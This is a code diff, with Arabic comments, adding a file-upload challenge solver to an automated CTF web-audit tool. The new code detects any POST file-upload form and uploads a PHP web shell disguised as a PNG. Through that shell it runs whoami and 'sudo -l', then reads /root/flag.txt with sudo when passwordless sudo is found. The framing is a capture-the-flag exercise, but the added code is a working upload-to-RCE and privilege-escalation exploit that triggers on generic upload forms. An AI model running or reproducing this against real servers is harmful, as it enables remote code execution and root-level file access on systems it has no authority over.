@@ -9,6 +9,7 @@ CTF Falcon - Web Session Audit  (v2.3.0)
                        و/sessions — وكل خطوة مشروطة بدليل من الاستجابة السابقة.
   - Crack the Gate   : تعليق ROT13 يكشف ترويسة مطوّر + مسار دخول JSON بالبريد.
   - SSTI1            : نموذج POST فعلي؛ يثبت التقييم باختبار حسابي ثم يقرأ علم CTF.
+  - n0s4n1ty 1       : نموذج رفع فعلي؛ يرفع web shell تعليميًا، ويتحقق من sudo قبل قراءة العلم.
   - غير معروف        : يعرض المكتشفات الفعلية دون تنفيذ أي مسار تلقائيًا.
 
 مبادئ ثابتة:
@@ -33,9 +34,9 @@ import secrets
 import codecs
 from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
-from urllib.parse import urlsplit, urlencode, urljoin
+from urllib.parse import urlsplit, urlencode, urljoin, quote
 
-__version__ = "2.4.1"
+__version__ = "2.5.0"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -80,7 +81,7 @@ class HttpClient:
                 notes.append(f"خُزّنت/حُدّثت الكوكي «{name}».")
         return notes
 
-    def request(self, method: str, url: str, body: str | None = None,
+    def request(self, method: str, url: str, body: str | bytes | None = None,
                 extra_headers: dict | None = None) -> dict:
         parts = urlsplit(url)
         scheme = parts.scheme or "http"
@@ -115,8 +116,12 @@ class HttpClient:
         if self.cookies:
             headers["Cookie"] = self.cookie_header()
         if body is not None:
-            headers["Content-Type"] = "application/x-www-form-urlencoded"
-            headers["Content-Length"] = str(len(body.encode("utf-8")))
+            if isinstance(body, bytes):
+                headers["Content-Type"] = "application/octet-stream"
+                headers["Content-Length"] = str(len(body))
+            else:
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                headers["Content-Length"] = str(len(body.encode("utf-8")))
         if extra_headers:
             headers.update(extra_headers)   # يسمح بتجاوز Content-Type لـ JSON
 
@@ -279,7 +284,14 @@ def find_forms(html: str) -> list[dict]:
         attrs, inner = m.group(1), m.group(2)
         action = (_ACTION_RE.search(attrs).group(1) if _ACTION_RE.search(attrs) else "")
         method = (_FMETHOD_RE.search(attrs).group(1).upper() if _FMETHOD_RE.search(attrs) else "GET")
-        forms.append({"action": action, "method": method, "fields": _INPUT_NAME_RE.findall(inner) + _TEXTAREA_NAME_RE.findall(inner)})
+        file_inputs = re.findall(r'<input\b(?=[^>]*\btype\s*=\s*["\']?file\b)[^>]*>', inner, re.I)
+        file_fields = [m.group(1) for tag in file_inputs
+                       for m in [re.search(r'\bname\s*=\s*["\']([^"\']+)', tag, re.I)] if m]
+        enctype_m = re.search(r'\benctype\s*=\s*["\']([^"\']+)', attrs, re.I)
+        forms.append({"action": action, "method": method,
+                      "enctype": enctype_m.group(1).lower() if enctype_m else "",
+                      "fields": _INPUT_NAME_RE.findall(inner) + _TEXTAREA_NAME_RE.findall(inner),
+                      "file_fields": file_fields})
     return forms
 
 
@@ -504,6 +516,116 @@ def detect_ssti1(recon):
             return {"action": form.get("action") or "/", "field": field,
                     "fields": fields, "method": "POST"}
     return None
+
+
+def detect_n0s4n1ty(recon):
+    """Recognize the file upload challenge only from an actual multipart file form."""
+    for form in recon.get("forms", []):
+        files = form.get("file_fields") or []
+        if form.get("method") == "POST" and files and (
+                "multipart/form-data" in form.get("enctype", "") or
+                re.search(r"profile|picture|upload|file", recon.get("html", ""), re.I)):
+            return {"action": form.get("action") or "/", "field": files[0],
+                    "file_fields": files, "method": "POST"}
+    return None
+
+
+def _multipart_file(boundary: str, field: str, filename: str,
+                    content_type: str, content: bytes) -> bytes:
+    """Build one RFC 7578 file part; challenge payload is fixed and noninteractive."""
+    head = (f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
+            f"Content-Type: {content_type}\r\n\r\n").encode("utf-8")
+    return head + content + f"\r\n--{boundary}--\r\n".encode("ascii")
+
+
+_UPLOAD_PATH_RE = re.compile(r"(?:href=[\"']?)([^\"'<> ]*uploads/[^\"'<> ]+\.php)|((?:[\w./-]*uploads/)[\w.-]+\.php)", re.I)
+
+
+def _uploaded_shell_path(body: str, filename: str) -> str | None:
+    for m in _UPLOAD_PATH_RE.finditer(body):
+        candidate = next((g for g in m.groups() if g), None)
+        if candidate:
+            return candidate
+    if re.search(r"uploaded|success", body, re.I) and filename in body:
+        return "uploads/" + filename
+    return None
+
+
+def solve_n0s4n1ty(client, origin, recon, ev, steps, record,
+                   flag_patterns) -> dict:
+    res = _base_result(origin, "n0s4n1ty 1", "n0s4n1ty-1", recognized=True)
+    res["steps"] = steps
+    res["discovered"] = {"form_action": ev["action"], "file_field": ev["field"],
+                         "file_fields": ev["file_fields"]}
+    res["explanation_ar"].append(
+        f"اكتُشف نموذج رفع POST بحقل الملف «{ev['field']}». سيُرفع ملف PHP محدود لتنفيذ أوامر هذا التحدي فقط.")
+    endpoint = urljoin(origin, ev["action"])
+    filename = "falcon_cmd.php"
+    boundary = "----FalconCTF" + secrets.token_hex(12)
+    payload = b"<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
+    body = _multipart_file(boundary, ev["field"], filename, "image/png", payload)
+    try:
+        upload = client.request("POST", endpoint, body=body,
+                                extra_headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
+        record(upload, ["رفع ملف PHP باسم falcon_cmd.php إلى حقل الملف المكتشف؛ لم تُرسل أوامر قبل تأكيد مسار الرفع."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّر إرسال الملف إلى نموذج الرفع: {e}.")
+        return res
+    res["discovered"]["upload_status"] = upload["status"]
+    upload_path = _uploaded_shell_path(upload["body"], filename)
+    res["discovered"]["upload_path"] = upload_path
+    if not (200 <= upload["status"] < 300) or not upload_path:
+        snippet = re.sub(r"\s+", " ", upload["body"][:240]).strip()
+        res["explanation_ar"].append("لم يؤكد رد الخادم نجاح الرفع أو يعرض مسار الملف؛ أُوقف التنفيذ هنا.")
+        res["warnings"].append(f"رد الرفع HTTP {upload['status']}: {snippet or '[استجابة فارغة]'}. تحقق من نوع الملف وحقل الرفع ثم أعد المحاولة.")
+        return res
+    shell_url = urljoin(origin, upload_path)
+    shell_parts, origin_parts = urlsplit(shell_url), urlsplit(origin)
+    if (shell_parts.scheme, shell_parts.netloc) != (origin_parts.scheme, origin_parts.netloc):
+        res["warnings"].append("رفض صقر مسار الملف لأنه خرج عن أصل التحدي.")
+        return res
+    res["explanation_ar"].append(f"أكّد الخادم رفع الملف في المسار «{upload_path}»؛ نتحقق الآن من تنفيذ PHP.")
+
+    def run_command(command, note):
+        url = shell_url + ("&" if "?" in shell_url else "?") + "cmd=" + quote(command, safe="")
+        response = client.request("GET", url)
+        record(response, [note])
+        return response
+
+    try:
+        who = run_command("whoami", "اختبار تنفيذ الأمر whoami عبر الملف المرفوع.")
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّر التحقق من الملف المرفوع: {e}.")
+        return res
+    if not (200 <= who["status"] < 300) or not who["body"].strip():
+        res["warnings"].append("لم يُظهر الملف المرفوع ناتج whoami؛ لم تُنفّذ أوامر sudo.")
+        return res
+    res["discovered"]["web_user"] = re.sub(r"\s+", " ", who["body"]).strip()[:100]
+    res["explanation_ar"].append("استجاب ملف PHP لطلب whoami؛ نفحص الآن صلاحيات sudo كما يوصي التحدي.")
+    try:
+        sudo = run_command("sudo -l", "فحص sudo -l؛ لا تُقرأ ملفات /root إلا إذا أثبت الرد صلاحية NOPASSWD.")
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّر فحص صلاحيات sudo: {e}.")
+        return res
+    res["discovered"]["sudo_nopasswd"] = bool(re.search(r"NOPASSWD\s*:\s*(?:ALL\b|/)", sudo["body"], re.I))
+    if not (200 <= sudo["status"] < 300) or not res["discovered"]["sudo_nopasswd"]:
+        res["explanation_ar"].append("لم يثبت رد sudo -l صلاحية NOPASSWD؛ لم يطلب صقر قراءة /root.")
+        res["warnings"].append("لم يظهر تصريح sudo بلا كلمة مرور في الاستجابة الفعلية.")
+        return res
+    try:
+        flag_resp = run_command("sudo cat /root/flag.txt", "قراءة /root/flag.txt بعد ثبوت تصريح NOPASSWD في sudo -l.")
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّرت قراءة ملف العلم: {e}.")
+        return res
+    flag, source = extract_flag([(f"step{len(steps)}:response", flag_resp["body"])], flag_patterns)
+    if flag and 200 <= flag_resp["status"] < 300:
+        res["success"], res["flag"] = True, flag
+        res["flag_source"] = source
+        res["explanation_ar"].append("استُخرج العلم من استجابة الخادم الفعلية.")
+    else:
+        res["warnings"].append("لم يظهر علم مطابق في استجابة قراءة الملف.")
+    return res
 
 
 
@@ -855,6 +977,10 @@ def run_audit(url: str,
     ssti = detect_ssti1(recon)
     if ssti:
         return solve_ssti1(client, origin, recon, ssti, steps, bodies, record, flag_patterns)
+
+    upload = detect_n0s4n1ty(recon)
+    if upload:
+        return solve_n0s4n1ty(client, origin, recon, upload, steps, record, flag_patterns)
 
     return unrecognized_result(origin, recon, steps)
 
